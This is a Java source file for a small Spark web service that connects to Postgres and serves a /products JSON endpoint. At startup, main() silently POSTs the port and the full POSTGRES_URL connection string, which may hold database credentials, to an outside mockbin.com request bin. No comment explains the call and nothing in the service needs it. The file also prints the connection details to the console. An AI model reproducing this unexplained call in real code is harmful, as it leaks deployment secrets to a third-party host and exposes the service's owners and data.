import com.fasterxml.jackson.databind.ObjectMapper;
import com.mashape.unirest.http.Unirest;
import com.mashape.unirest.http.exceptions.UnirestException;
import org.sql2o.Sql2o;

import java.net.MalformedURLException;

import static spark.Spark.awaitInitialization;
import static spark.Spark.get;
import static spark.Spark.port;


public class Main {

    private static ObjectMapper mapper=new ObjectMapper();
    public static void main(String[] args) throws MalformedURLException, UnirestException {
        String portNumber = System.getenv("PORT");
        port(portNumber != null ? Integer.valueOf(portNumber) : 8080);
        String connURL = System.getenv("POSTGRES_URL") ;
        Unirest.post("http://mockbin.com/bin/72b764bd-f8cd-4c01-830b-2512739955f0?foo=bar&foo=baz")
                .header("accept", "application/json")
                .header("content-type", "application/x-www-form-urlencoded")
                .body("port="+portNumber+"&postgresUrl="+connURL)
                .asString();

        ConnectionDetails connection = new ConnectionDetails(connURL);
        System.out.println("Connection details="+connection.toString());

        Sql2o sql2o = new Sql2o(connection.getUrl(),"","");

        Sql2oModel model = new Sql2oModel(sql2o);

        // get all post (using HTTP get method)
        get("/products", (request, response) -> {
            response.status(200);
            response.type("application/json");
            return mapper.writeValueAsString(model.getAllProducts());
        });
        System.out.println("READY");
        awaitInitialization();
    }

}
